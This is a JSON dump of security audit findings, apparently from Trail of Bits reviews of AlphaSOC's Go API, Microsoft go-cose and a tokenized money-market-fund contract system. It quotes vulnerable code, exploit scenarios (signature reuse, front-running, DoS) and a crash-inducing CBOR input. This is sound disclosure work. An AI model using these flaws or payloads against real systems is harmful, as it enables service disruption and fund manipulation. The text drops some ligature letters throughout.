... err := json.NewDecoder(body).Decode(v) if err != nil { panic(BadRequest(\"Failed to parse request body\", \"jsonErr\", err)) } } Figure 3.1: clap/lib/clap/request.go#L31L42 // MustBeAuthenticated returns user ID if request authenticated, // otherwise panics. func (r *Request) MustBeAuthenticated() User { user, err := r.User() if err == nil && user == nil { err = errors.New(\"user is nil\") } else if !user.Valid() { err = errors.New(\"user id is zero\") } if err != nil { panic(Error(\"not authenticated: \" + err.Error())) } return *user } Figure 3.2: clap/lib/clap/request.go#L134L147 defer func() { if e := recover(); e != nil { if err, ok := e.(*RequestError); ok { onError(w, r, err) } else { panic(e) } } }() Figure 3.3: clap/lib/clap/handler.go#L93L101 Recommendations Short term, change the code in gures 3.1, 3.2, and 3.3 so that it adheres to the conventions of handling expected errors in Go. This will simplify the error-handling functionality and the process of reasoning about the code. Reserving panics for unexpected situations or bugs in the code will also help surface incorrect assumptions. Long term, use panics only to handle unexpected errors.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "4. Confusing API authentication mechanism ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-alphasoc-alphasocapi-securityreview.pdf", "body": "The clap HTTP endpoint handler code appears to indicate that the handlers perform manual endpoint authentication. This is because when a handler receives a clap.Request, it calls the MustBeAuthenticated method (gure 4.1). The name of this method could imply that it is called to authenticate the endpoint. However, MustBeAuthenticated returns information on the (already authenticated) user who submitted the request; authentication is actually performed by default by a centralized mechanism before the call to a handler. Thus, the use of this method could cause confusion regarding the timing of authentication. func (h *AlertsHandler) handleGet(r *clap.Request) interface{} { // Parse arguments q := r.URL.Query() var minSeverity uint64 if ms := q.Get(\"minSeverity\"); ms != \"\" { var err error minSeverity, err = strconv.ParseUint(ms, 10, 8) if err != nil || minSeverity > 5 { return clap.BadRequest(\"Invalid minSeverity parameter\") } } if h.MinSeverity > minSeverity { minSeverity = h.MinSeverity } filterEventType := q.Get(\"eventType\") user := r.MustBeAuthenticated() ... } Figure 4.1: clap/apiv1/alerts.go#L363L379 Recommendations Short term, add a ServeAuthenticatedAPI interface method that takes an additional user parameter indicating that the handler is already in the authenticated context. Long term, document the authentication system to make it easier for new team members and auditors to understand and to facilitate their onboarding.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "5. Use of MD5 can lead to lename collisions ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-alphasoc-alphasocapi-securityreview.pdf", "body": "When generating a lename, the deriveQueueFile function uses an unsafe MD5 hash function to hash the destinationID that is included in the lename (gure 5.1). func deriveQueueFile(outputType, destinationID string) string { return fmt.Sprintf(\"%s-%x.bdb\", outputType, md5.Sum([]byte(destinationID))) } Figure 5.1: ae/config/config.go#L284L286 Exploit Scenario An attacker with control of a destinationID value modies the value, with the goal of causing a hash collision. The hash computed by md5.Sum collides with that of an existing lename. As a result, the existing le is overwritten. Recommendations Short term, replace the MD5 function with a safer alternative such as SHA-2. Long term, avoid using the MD5 function unless it is necessary for interfacing with a legacy system in a non-security-related context.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "6. Overly broad le permissions ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-alphasoc-alphasocapi-securityreview.pdf", "body": "In several parts of the ae code, les are created with overly broad permissions that allow them to be read by anyone in the system. This occurs in the following code paths:  ae/tools/copy.go#L50  ae/bqimport/import.go#L291  ae/tools/migrate.go#L127  ae/tools/migrate.go#L223  ae/tools/migrate.go#L197  ae/tools/copy.go#L16  ae/main.go#L319 Recommendations Short term, change the le permissions, limiting them to only those that are necessary. Long term, always consider the principle of least privilege when making decisions about le permissions.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "7. Unhandled errors ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-alphasoc-alphasocapi-securityreview.pdf", "body": "The gosec tool identied many unhandled errors in the ae and clap codebases. Recommendations Short term, run gosec on the ae and clap codebases, and address the unhandled errors. Even if an error is considered unimportant, it should still be handled and discarded, and the decision to discard it should be justied in a code comment. Long term, encourage the team to use gosec, and run it before any major release.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "1. Unmarshalling can cause a panic if any header labels are unhashable ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Microsoft-go-cose.pdf", "body": "The ensureCritical function checks that all critical labels exist in the protected header. The check for each label is shown in Figure 1.1. 161 if _, ok := h[label]; !ok { Figure 1.1: Line 161 of headers.go The label in this case is deserialized from the users CBOR input. If the label is a non-hashable type (e.g., a slice or a map), then Go will runtime panic on line 161. Exploit Scenario Alice wishes to crash a server running go-cose. She sends the following CBOR message to the server: \\xd2\\x84G\\xc2\\xa1\\x02\\xc2\\x84@0000C000C000. When the server attempts to validate the critical headers during unmarshalling, it panics on line 161. Recommendations Short term, add a validation step to ensure that the elements of the critical header are valid labels. Long term, integrate go-coses existing fuzz tests into the CI pipeline. Although this bug was not discovered using go-coses preexisting fuzz tests, the tests likely would have discovered it if they ran for enough time. Fix Analysis This issue has been resolved. Pull request #78, committed to the main branch in b870a00b4a0455ab5c3da1902570021e2bac12da, adds validations to ensure that critical headers are only integers or strings. 15 Microsoft go-cose Security Assessment", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Low"]}, {"title": "2. crit label is permitted in unvalidated headers ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Microsoft-go-cose.pdf", "body": "The crit header parameter identies which header labels must be understood by an application receiving the COSE message. Per RFC 8152, this value must be placed in the protected header bucket, which is authenticated by the message signature. Figure 2.1: Excerpt from RFC 8152 section 3.1 Currently, the implementation ensures during marshaling and unmarshaling that if the crit parameter is present in the protected header, then all indicated labels are also present in the protected header. However, the implementation does not ensure that the crit parameter is not present in the unprotected bucket. If a user mistakenly uses the unprotected header for the crit parameter, then other conforming COSE implementations may reject the message and the message may be exposed to tampering. Exploit Scenario A library user mistakenly places the crit label in the unprotected header, allowing an adversary to manipulate the meaning of the message by adding, removing, or changing the set of critical headers. Recommendations Add a check during ensureCritical to verify that the crit label is not present in the unprotected header bucket. Fix Analysis This issue has been resolved. Pull request #81, committed to the main branch in 62383c287782d0ba5a6f82f984da0b841e434298, adds validations to ensure that the crit label is not present in unprotected headers. 16 Microsoft go-cose Security Assessment", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Low"]}, {"title": "3. Generic COSE header types are not validated ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Microsoft-go-cose.pdf", "body": "Section 3.1 of RFC 8152 denes a number of common COSE header parameters and their associated value types. Applications using the go-cose library may rely on COSE-dened headers decoded by the library to be of a specied type. For example, the COSE specication denes the content-type header (label #3) as one of two types: a text string or an unsigned integer. The go-cose library validates only the alg and crit parameters, not content-type. See Figure 3.1 for a list of dened header types. Figure 3.1: RFC 8152 Section 3.1, Table 2 Further header types are dened by the IANA COSE Header Parameter Registry. 17 Microsoft go-cose Security Assessment Exploit Scenario An application uses go-cose to verify and validate incoming COSE messages. The application uses the content-type header to index a map, expecting the content type to be a valid string or integer. An attacker could, however, supply an unhashable value, causing the application to panic. Recommendations Short term, explicitly document which IANA-dened headers or label ranges are and are not validated. Long term, validate commonly used headers for type and semantic consistency. For example, once counter signatures are implemented, the counter-signature (label #7) header should be validated for well-formedness during unmarshalling. 18 Microsoft go-cose Security Assessment", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "1. Canceling all transaction requests causes DoS on MMF system ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-05-franklintempleton-moneymarket-securityreview.pdf", "body": "Any shareholder can cancel any transaction request, which can result in a denial of service (DoS) from the MMF system. The TransactionalModule contract uses transaction requests to store buy and sell orders from users. These requests are settled at the end of the day by the admins. Admins can create or cancel a request for any user. Users can create requests for themselves and cancel their own requests. The TransferAgentGateway contract is an entry point for all user and admin actions. It implements access control checks and forwards the calls to their respective modules. The cancelRequest function in the TransferAgentGateway contract checks that the caller is the owner or a shareholder. However, if the caller is not the owner, the caller is not matched against the account argument. This allows any shareholder to call the cancelRequest function in the TransactionalModule for any account and requestId . function cancelRequest ( address account , bytes32 requestId , string calldata memo ) external override { require ( msg.sender == owner() || IAuthorization( moduleRegistry.getModuleAddress(AUTHORIZATION_MODULE) ).isAccountAuthorized( msg.sender ), \"OPERATION_NOT_ALLOWED_FOR_CALLER\" ); ICancellableTransaction( moduleRegistry.getModuleAddress(TRANSACTIONAL_MODULE) ).cancelRequest(account, requestId, memo); } Figure 1.1: The cancelRequest function in the TransferAgentGateway contract As shown in gure 1.2, the if condition in the cancelRequest function in the TransactionalModule contract implements a check that does not allow shareholders to cancel transaction requests created by the admin. However, this check passes because the TransferAgentGateway contract is set up as the admin account in the authorization module. function cancelRequest ( address account , bytes32 requestId , string calldata memo ) external override onlyAdmin onlyShareholder(account) { require ( transactionDetailMap[requestId].txType > ITransactionStorage.TransactionType.INVALID, \"INVALID_TRANSACTION_ID\" ); if (!transactionDetailMap[requestId].selfService) { require ( IAuthorization(modules.getModuleAddress(AUTHORIZATION_MODULE)) .isAdminAccount( msg.sender ), \"CALLER_IS_NOT_AN_ADMIN\" ); } require ( pendingTransactionsMap[account].remove(requestId), \"INVALID_TRANSACTION_ID\" ); delete transactionDetailMap[requestId]; accountsWithTransactions.remove(account); emit TransactionCancelled(account, requestId, memo); } Figure 1.2: The cancelRequest function in the TransactionalModule contract Thus, a shareholder can cancel any transaction request created by anyone. Exploit Scenario Eve becomes an authorized shareholder and sets up a bot to listen to the TransactionSubmitted event on the TransactionalModule contract. The bot calls the cancelRequest function on the TransferAgentGateway contract for every event and cancels all the transaction requests before they are settled, thus executing a DoS attack on the MMF system. Recommendations Short term, add a check in the TransferAgentGateway contract to allow shareholders to cancel requests only for their own accounts. Long term, document access control rules in a publicly accessible location. These rules should encompass admin, non-admin, and common functions. Ensure the code adheres to that specication by extending unit test coverage for positive and negative expectations within the system. Add fuzz tests where access control rules are the invariants under test.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Low"]}, {"title": "2. Lack of validation in the IntentValidationModule contract can lead to inconsistent state ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-05-franklintempleton-moneymarket-securityreview.pdf", "body": "Lack of validation in the state-modifying functions of the IntentValidationModule contract can cause users to be locked out of the system. As shown in gure 2.1, the setDeviceKey function in IntentValidationModule allows adding a device ID and key to multiple accounts, which may result in the unauthorized use of a device ID. function setDeviceKey ( address account , uint256 deviceId , string memory key ) external override onlyAdmin { devicesMap[account].add(deviceId); deviceKeyMap[deviceId] = key; emit DeviceKeyAdded(account, deviceId); } Figure 2.1: The setDeviceKey functions in the IntentValidationModule contract Additionally, a lack of validation in the clearDeviceKey and clearAccountKeys functions can cause the key for a device ID to become zero, which may prevent users from authenticating their requests. function clearDeviceKey ( address account , uint256 deviceId ) external override onlyAdmin { _removeDeviceKey(account, deviceId); } function clearAccountKeys ( address account ) external override onlyAdmin { uint256 [] memory devices = devicesMap[account].values(); for ( uint i = 0 ; i < devices.length; ) { _removeDeviceKey(account, devices[i]); unchecked { i++; } } } Figure 2.2: Functions to clear device ID and key in the IntentValidationModule contract The account-todevice ID mapping and device IDto-key mapping are used to authenticate user actions in an o-chain component, which can malfunction in the presence of these inconsistent states and lead to the authentication of malicious user actions. Exploit Scenario An admin adds the DEV_A device and the KEY_K key to Bob. Then there are multiple scenarios to cause an inconsistent state, such as the following: Adding one device to multiple accounts: 1. An admin adds the DEV_A device and the KEY_K key to Alice by mistake. 2. Alice can use Bobs device to send unauthorized requests. Overwriting a key for a device ID: 1. An admin adds the DEV_A device and the KEY_L key to Alice, which overwrites the key for the DEV_A device from KEY_K to KEY_L . 2. Bob cannot authenticate his requests with his KEY_K key. Setting a key to zero for a device ID: 1. An admin adds the DEV_A device and the KEY_K key to Alice by mistake. 2. An admin removes the DEV_A device from Alices account. This sets the key for the DEV_A device to zero, which is still added to Bobs account. 3. Bob cannot authenticate his requests with his KEY_K key. Recommendations Short term, make the following changes:   Add a check in the setDeviceKey function to ensure that a device is not added to multiple accounts. Add a new function to update the key of an already added device with correct validation checks for the update. Long term, document valid system states and the state transitions allowed from each state. Ensure proper data validation checks are added in all state-modifying functions with unit and fuzzing tests.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "3. Pending transactions cannot be settled ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-05-franklintempleton-moneymarket-securityreview.pdf", "body": "An account removed from the accountsWithTransactions state variable will have its pending transactions stuck in the system, resulting in an opportunity cost loss for the users. The accountsWithTransactions state variable in the TransactionalModule contract is used to keep track of accounts with pending transactions. It is used in the following functions:   The getAccountsWithTransactions function to return the list of accounts with pending transactions The hasTransactions function to check if an account has pending transactions. However, the cancelRequest function in the TransactionalModule contract removes the account from the accountsWithTransactions list for every cancellation. If an account has multiple pending transactions, canceling only one of the transaction requests will remove the account from the accountsWithTransactions list. function cancelRequest ( address account , bytes32 requestId , string calldata memo ) external override onlyAdmin onlyShareholder(account) { require ( transactionDetailMap[requestId].txType > ITransactionStorage.TransactionType.INVALID, \"INVALID_TRANSACTION_ID\" ); if (!transactionDetailMap[requestId].selfService) { require ( IAuthorization(modules.getModuleAddress(AUTHORIZATION_MODULE)) .isAdminAccount( msg.sender ), \"CALLER_IS_NOT_AN_ADMIN\" ); } require ( pendingTransactionsMap[account].remove(requestId), \"INVALID_TRANSACTION_ID\" ); delete transactionDetailMap[requestId]; accountsWithTransactions.remove(account); emit TransactionCancelled(account, requestId, memo); } Figure 3.1: The cancelRequest function in the TransactionalModule contract In gure 3.1, the account has pending transactions, but it is not present in the accountsWithTransactions list. The o-chain components and other functionality relying on the getAccountsWithTransactions and hasTransactions functions will see these accounts as not having any pending transactions. This may result in non-settlement of the pending transactions for these accounts, leading to a loss for the users. Exploit Scenario Alice, a shareholder, creates multiple transaction requests and cancels the last request. For the next settlement process, the o-chain component calls the getAccountsWithTransactions function to get the list of accounts with pending transactions and settles these accounts. After the settlement run, Alice checks her balance and is surprised that her transaction requests are not settled. She loses prots from upcoming market movements. Recommendations Short term, have the code use the unlistFromAccountsWithPendingTransactions function in the cancelRequest function to update the accountsWithTransactions list. Long term, document the system state machine specication and follow it to ensure proper data validation checks are added in all state-modifying functions.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Low"]}, {"title": "4. Deauthorized accounts can keep shares of the MMF ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-05-franklintempleton-moneymarket-securityreview.pdf", "body": "An unauthorized account can keep shares if the admin deauthorizes the shareholder without zeroing their balance. This can lead to legal issues because unauthorized users can keep shares of the MMF. The deauthorizeAccount function in the AuthorizationModule contract does not check that the balance of the provided account is zero before revoking the ROLE_FUND_AUTHORIZED role: function deauthorizeAccount ( address account ) external override onlyRole(ROLE_AUTHORIZATION_ADMIN) { require (account != address ( 0 ), \"INVALID_ADDRESS\" ); address txModule = modules.getModuleAddress( keccak256 ( \"MODULE_TRANSACTIONAL\" ) ); require (txModule != address ( 0 ), \"MODULE_REQUIRED_NOT_FOUND\" ); require ( hasRole(ROLE_FUND_AUTHORIZED, account), \"SHAREHOLDER_DOES_NOT_EXISTS\" ); require ( !ITransactionStorage(txModule).hasTransactions(account), \"PENDING_TRANSACTIONS_EXIST\" ); _revokeRole(ROLE_FUND_AUTHORIZED, account); emit AccountDeauthorized(account); } Figure 4.1: The deauthorizeAccount function in the AuthorizationModule contract If an admin account deauthorizes a shareholder account without making the balance zero, the unauthorized account will keep the shares of the MMF. The impact is limited, however, because the unauthorized account will not be able to liquidate the shares. The admin can also adjust the balance of the account to make it zero. However, if the admin forgets to adjust the balance or is unable to adjust the balance, it can lead to an unauthorized account holding shares of the MMF. Recommendations Short term, add a check in the deauthorizeAccount function to ensure that the balance of the provided account is zero. Long term, document the system state machine specication and follow it to ensure proper data validation checks are added in all state-modifying functions. Add fuzz tests where the rules enforced by those validation checks are the invariants under test.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "5. Solidity compiler optimizations can be problematic ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-05-franklintempleton-moneymarket-securityreview.pdf", "body": "The MMF has enabled optional compiler optimizations in Solidity. According to a November 2018 audit of the Solidity compiler , the optional optimizations may not be safe . optimizer: { enabled: true , runs: 200 , }, Figure 5.1: Hardhat optimizer enabled in hardhat.config.js Solidity compiler optimizations are disabled by default, and it is unclear how many contracts in the wild use them. Therefore, it is unclear how well they are being tested and exercised. Moreover, optimizations are actively being developed . High-severity security issues due to optimization bugs have occurred in the past. A high-severity bug in the emscripten -generated solc-js compiler used by True and Remix persisted until late 2018; the x for this bug was not reported in the Solidity changelog. Another high-severity optimization bug resulting in incorrect bit shift results was patched in Solidity 0.5.6 . More recently, another bug due to the incorrect caching of Keccak-256 was reported. It is likely that there are latent bugs related to optimization and that new bugs will be introduced due to future optimizations. Exploit Scenario A latent or future bug in Solidity compiler optimizationsor in the Emscripten transpilation to solc-js causes a security vulnerability in the MMF contracts. Recommendations Short term, measure the gas savings from optimizations and carefully weigh them against the possibility of an optimization-related bug. Long term, monitor the development and adoption of Solidity compiler optimizations to assess their maturity.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "6. Project dependencies contain vulnerabilities ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-05-franklintempleton-moneymarket-securityreview.pdf", "body": "Although dependency scans did not identify a direct threat to the project codebase, npm audit found dependencies with known vulnerabilities. Due to the sensitivity of the deployment code and its environment, it is important to ensure dependencies are not malicious. Problems with dependencies in the JavaScript community could have a signicant eect on the MMF system. The output detailing the identied issues has been included below: Dependency Version ID", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: High"]}, {"title": "7. Unimplemented getVersion function returns default value of zero ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-05-franklintempleton-moneymarket-securityreview.pdf", "body": "The getVersion function within the TransferAgentModule contract is not implemented; at present, it yields the default uint8 value of zero. function getVersion() external pure virtual override returns ( uint8 ) {} Figure 7.1: Unimplemented getVersion function in the TransferAgentModule contract The other module contracts establish a pattern where the getVersion function is supposed to return a value of one. function getVersion() external pure virtual override returns ( uint8 ) { return 1; } Figure 7.2: Implemented getVersion function in the TransactionalModule contract Exploit Scenario Alice calls the getVersion function on the TransferAgentModule contract. It returns zero, and all the other module contracts return one. Alice misunderstands the system and which contracts are on what version of their lifecycle. Recommendations Short term, implement the getVersion function in the TransferAgentModule contract so it matches the specication established in the other modules. Long term, use the Slither static analyzer to catch common issues such as this one. Implement slither-action into the projects CI pipeline.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "8. The MultiSigGenVerier threshold can be passed with a single signature ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-05-franklintempleton-moneymarket-securityreview.pdf", "body": "A single signature can be used multiple times to pass the threshold in the MultiSigGenVerifier contract, allowing a single signer to take full control of the system. The signedDataExecution function in the MultiSigGenVerifier contract veries provided signatures and accumulates the acquiredThreshold value in a loop as shown in gure 8.1: for ( uint256 i = 0 ; i < signaturesCount; i++) { (v, r, s) = _splitSignature(signatures, i); address signerRecovered = ecrecover( hash , v, r, s); if (signersSet.contains(signerRecovered)) { acquiredThreshold += signersMap[signerRecovered]; } } Figure 8.1: The signer recovery section of the signedDataExecution function in the MultiSigGenVerifier contract This code checks whether the recovered signer address is one of the previously added signers and adds the signers weight to acquiredThreshold . However, the code does not check that all the recorded signers are unique, which allows the submitter to pass the threshold with only a single signature to execute the signed transaction. The current function has an implicit zero-address check in the subsequent if statementto add new signers, they must not be address(0) . If this logic changes in the future, the impact of the ecrecover function returning address(0) (which happens when a signature is malformed) must be carefully reviewed. Exploit Scenario Eve, a signer, colludes with a submitter to settle their transactions at a favorable date and price. Eve signs the transaction and provides it to the submitter. The submitter uses this signature to call the signedDataExecution function by repeating the same signature multiple times in the signatures argument array to pass the threshold. Using this method, Eve can execute any admin transaction without consent from other admins. Recommendations Short term, have the code verify that the signatures provided to the signedDataExecution function are unique. One way of doing this is to sort the signatures in increasing order of the signer addresses and verify this order in the loop. An example of this order verication code is shown in gure 8.2: address lastSigner = address(0); for ( uint256 i = 0 ; i < signaturesCount; i++) { (v, r, s) = _splitSignature(signatures, i); address signerRecovered = ecrecover( hash , v, r, s); require (lastSigner < signerRecovered); lastSigner = signerRecovered; if (signersSet.contains(signerRecovered)) { acquiredThreshold += signersMap[signerRecovered]; } } Figure 8.2: An example code to verify uniqueness of the provided signatures Long term, expand unit test coverage to account for common edge cases, and carefully consider all possible values for any user-provided inputs. Implement fuzz testing to explore complex scenarios and nd dicult-to-detect bugs in functions with user-provided inputs.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Medium"]}, {"title": "9. Shareholders can renounce their authorization role ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-05-franklintempleton-moneymarket-securityreview.pdf", "body": "Shareholders can renounce their authorization role. As a result, system contracts that check for authorization and o-chain components may not work as expected because of an inconsistent system state. The AuthorizationModule contract extends the AccessControlUpgradeable contract from the OpenZeppelin library. The AccessControlUpgradeable contract has a public renounceRole function, which can be called by anyone to revoke a role on their own account. function renounceRole ( bytes32 role , address account ) public virtual override { require (account == _msgSender(), \"AccessControl: can only renounce roles for self\" ); _revokeRole(role, account); } Figure 9.1: The renounceRole function of the base contract from the OpenZeppelin library Any shareholder can use the renounceRole function to revoke the ROLE_FUND_AUTHORIZED role on their own account without authorization from the admin. This role is used in three functions in the AccessControlUpgradeable contract: 1. The isAccountAuthorized function to check if an account is authorized 2. The getAuthorizedAccountsCount to get the number of authorized accounts 3. The getAuthorizedAccountAt to get the authorized account at an index Other contracts and o-chain components relying on these functions may nd the system in an inconsistent state and may not be able to work as expected. Exploit Scenario Eve, an authorized shareholder, renounces her ROLE_FUND_AUTHORIZED role. The o-chain components fetch the number of authorized accounts, which is one less than the expected value. The o-chain component is now operating on an inaccurate contract state. Recommendations Short term, have the code override the renounceRole function in the AuthorizationModule contract. Make this overridden function an admin-only function. Long term, read all the library code to nd public functions exposed by the base contracts and override them to implement correct business logic and enforce proper access controls. Document any changes between the original OpenZeppelin implementation and the MMF implementation. Be sure to thoroughly test overridden functions and changes in unit tests and fuzz tests.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Low"]}, {"title": "10. Risk of multiple dividend payouts in a day ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-05-franklintempleton-moneymarket-securityreview.pdf", "body": "The fund manager can lose the systems money by making multiple dividend payouts in a day when they should be paid out only once a day. The distributeDividends function in the MoneyMarketFund contract takes the date as an argument. This date value is not validated to be later than the date from an earlier execution of the distributeDividends function. function distributeDividends ( address [] calldata accounts, uint256 date , int256 rate , uint256 price ) { } external onlyAdmin onlyWithValidRate(rate) onlyValidPaginationSize(accounts.length, MAX_ACCOUNT_PAGE_SIZE) lastKnownPrice = price; for ( uint i = 0 ; i < accounts.length; ) { _processDividends(accounts[i], date, rate, price); unchecked { i++; } } Figure 10.1: The distributeDividends function in the MoneyMarketFund contract As a result, the admin can distribute dividends multiple times a day, which will result in the loss of funds from the company to the users. The admin can correct this mistake by using the adjustBalance function, but adjusting the balance for all the system users will be a dicult and costly process. The same issue also aects the following three functions: 1. The endOfDay function in the MoneyMarketFund contract 2. The distributeDividends function in the TransferAgentModule contract 3. The endOfDay function in the TransferAgentModule contract. Exploit Scenario The admin sends a transaction to distribute dividends. The transaction is not included in the blockchain because of congestion or gas estimation errors. Forgetting about the earlier transaction, the admin sends another transaction, and both transactions are executed to distribute dividends on the same day. Recommendations Short term, have the code store the last dividend distribution date and validate that the date argument in all the dividend distribution functions is later than the last stored dividend date. Long term, document the system state machine specication and follow it to ensure proper data validation checks are added to all state-modifying functions.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "11. Shareholders can stop admin from deauthorizing them ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-05-franklintempleton-moneymarket-securityreview.pdf", "body": "Shareholders can prevent the admin from deauthorizing them by front-running the deauthorizeAccount function in the AuthorizationModule contract. The deauthorizeAccount function reverts if the provided account has one or more pending transactions. function deauthorizeAccount ( address account ) external override onlyRole(ROLE_AUTHORIZATION_ADMIN) { require (account != address ( 0 ), \"INVALID_ADDRESS\" ); address txModule = modules.getModuleAddress( keccak256 ( \"MODULE_TRANSACTIONAL\" ) ); require (txModule != address ( 0 ), \"MODULE_REQUIRED_NOT_FOUND\" ); require ( hasRole(ROLE_FUND_AUTHORIZED, account), \"SHAREHOLDER_DOES_NOT_EXISTS\" ); require ( !ITransactionStorage(txModule).hasTransactions(account), \"PENDING_TRANSACTIONS_EXIST\" ); _revokeRole(ROLE_FUND_AUTHORIZED, account); emit AccountDeauthorized(account); } Figure 11.1: The deauthorizeAccount function in the AuthorizationModule contract A shareholder can front-run a transaction executing the deauthorizeAccount function for their account by submitting a new transaction request to buy or sell shares. The deauthorizeAccount transaction will revert because of a pending transaction for the shareholder. Exploit Scenario Eve, a shareholder, sets up a bot to front-run all deauthorizeAccount transactions that add a new transaction request for her. As a result, all admin transactions to deauthorize Eve fail. Recommendations Short term, remove the check for the pending transactions of the provided account and consider one of the following: 1. Have the code cancel the pending transactions of the provided account in the deauthorizeAccount function. 2. Add a check in the _processSettlements function in the MoneyMarketFund contract to skip unauthorized accounts. Add the same check in the _processSettlements function in the TransferAgentModule contract. Long term, always analyze all contract functions that can be aected by attackers front-running calls to manipulate the system.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Medium"]}, {"title": "12. Total number of submitters in MultiSigGenVerier contract can be more than allowed limit of MAX_SUBMITTERS ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-05-franklintempleton-moneymarket-securityreview.pdf", "body": "The total number of submitters in the MultiSigGenVerifier contract can be more than the allowed limit of MAX_SUBMITTERS . The addSubmitters function in the MultiSigGenVerifier contract does not check that the total number of submitters in the submittersSet is less than the value of the MAX_SUBMITTERS constant. function addSubmitters ( address [] calldata submitters) public onlyVerifier { require (submitters.length <= MAX_SUBMITTERS, \"INVALID_ARRAY_LENGTH\" ); for ( uint256 i = 0 ; i < submitters.length; i++) { submittersSet.add(submitters[i]); } } Figure 12.1: The addSubmitters function in the MultiSigGenVerifier contract This allows the admin to add more than the maximum number of allowed submitters to the MultiSigGenVerifier contract. Recommendations Short term, add a check to the addSubmitters function to verify that the length of the submittersSet is less than or equal to the MAX_SUBMITTERS constant. Long term, document the system state machine specication and follow it to ensure proper data validation checks are added in all state-modifying functions. To ensure MAX_SUBMITTERS is never exceeded, add fuzz testing where MAX_SUBMITTERS is the system invariant under test.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "13. Lack of contract existence check on target address ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-05-franklintempleton-moneymarket-securityreview.pdf", "body": "The signedDataExecution function lacks validation to ensure that the target argument is a contract address and not an externally owned account (EOA). The absence of such a check could lead to potential security issues, particularly when executing low-level calls to an address not containing contract code. Low-level calls to an EOA return true for the success variable instead of reverting as they would with a contract address. This unexpected behavior could trigger inadvertent execution of subsequent code relying on the success variable to be accurate, potentially resulting in undesired outcomes. The onlySubmitter modier limits the potential impact of this vulnerability. function signedDataExecution( address target, bytes calldata payload, bytes calldata signatures ) external onlySubmitter { ... // Wallet logic if (acquiredThreshold >= _getRequiredThreshold(target)) { (bool success, bytes memory result) = target.call{value: 0}( payload ); emit TransactionExecuted(target, result); if (!success) { assembly { result := add(result, 0x04) } revert(abi.decode(result, (string))); } } else { revert(\"INSUFICIENT_THRESHOLD_ACQUIRED\"); } } Figure 13.1: The signedDataExecution function in the MultiSigGenVerifier contract Exploit Scenario Alice, an authorized submitter account, calls the signedDataExecution function, passing in an EOA address instead of the expected contract address. The low-level call to the target address returns successfully and does not revert. As a result, Alice thinks she has executed code but in fact has not. Recommendations Short term, integrate a contract existence check to ensure that code is present at the address passed in as the target argument. Long term, use the Slither static analyzer to catch issues such as this one. Consider integrating slither-action into the projects CI pipeline.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "14. Pending transactions can trigger a DoS ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-05-franklintempleton-moneymarket-securityreview.pdf", "body": "An unbounded number of pending transactions can cause the _processSettlements function to run out of gas while trying to process them. There is no restriction on the length of pending transactions a user might have, and gas-intensive operations are performed in the for-loop of the _processSettlements function. If an account returns too many pending transactions, operations that call _processSettlements might revert with an out-of-gas error. function _processSettlements( address account, uint256 date, uint256 price ) internal whenTransactionsExist(account) { bytes32 [] memory pendingTxs = ITransactionStorage( moduleRegistry.getModuleAddress(TRANSACTIONAL_MODULE) ).getAccountTransactions(account); for ( uint256 i = 0; i < pendingTxs.length; ) { ... Figure 14.1: The pendingTxs loop in the _processSettlements function in the MoneyMarketFund contract The same issue aects the _processSettlements function in the TransferAgentModule contract. Exploit Scenario Eve submits multiple transactions to the requestSelfServiceCashPurchase function, and each creates a pending transaction record in the pendingTransactionsMap for Eves account. When settleTransactions is called with an array of accounts that includes Eve, the _processSettlements function tries to process all her pending transactions and runs out of gas in the attempt. Recommendations Short term, make the following changes to the transaction settlement ow: 1. Enhance the o-chain component of the system to identify accounts with too many pending transactions and exclude them from calls to _processSettlements ows. 2. Create another transaction settlement function that paginates over the list of pending transactions of a single account. Long term, implement thorough testing protocols for these loop structures, simulating various scenarios and edge cases that could potentially result in unbounded inputs. Ensure that all loop structures are robustly designed with safeguards in place, such as constraints and checks on input variables.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Medium"]}, 